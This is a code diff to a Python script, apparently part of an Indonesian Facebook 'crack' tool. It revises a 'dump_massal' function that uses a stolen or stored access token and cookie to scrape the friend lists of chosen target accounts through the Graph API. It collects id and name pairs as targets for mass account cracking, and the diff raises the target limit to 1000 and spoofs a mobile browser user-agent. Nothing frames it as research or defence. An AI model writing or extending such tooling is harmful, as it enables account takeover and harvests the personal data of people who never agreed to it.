@@ -762,46 +762,55 @@ def dump_massal():
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		exit()
+	    exit()
 	try:
-		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
-		jum = int(input(f' [+] Mau Berapa Idz Target  : '))
+		kumpulkan = int(input(f'\x1b[1;97m Mau Berapa Id? : '))
 	except ValueError:
-		print(' [+] Wrong input ')
-		exit()
-	if jum<1 or jum>80:
-		print(f' [+] Pertemanan Tidak Publik  ')
-		exit()
+	    exit()
+	if kumpulkan<1 or kumpulkan>1000:
+	    exit()
 	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input(f' [+] Masukan Idz Target Yang Ke '+str(yz)+' : ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print(' [+] Unstable Signal ')
-			exit()
+	bilangan = 0
+	for KOTG49H in range(kumpulkan):
+		bilangan+=1
+		Masukan = input(f'\x1b[1;97m Masukkan Id Yang Ke  '+str(bilangan)+f' : ')
+		uid.append(Masukan)
+	for user in uid:
+	    try:
+	       head = (
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
 	try:
-		print(f' [+] Total Idz Target Yang Terkumpul : {h}'+str(len(id)))
-		setting()
+	      print(f"\x1b[1;97m Total  :{h}{x} "+str(len(id))) 
+	      setting()
 	except requests.exceptions.ConnectionError:
-		print(f'')
-		print(' [+] Unstable Signal ')
-		exit()
+	    exit()
 	except (KeyError,IOError):
-		print(f' [+] Pertemanan Tidak Public ')
-		time.sleep(3)
 		exit()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
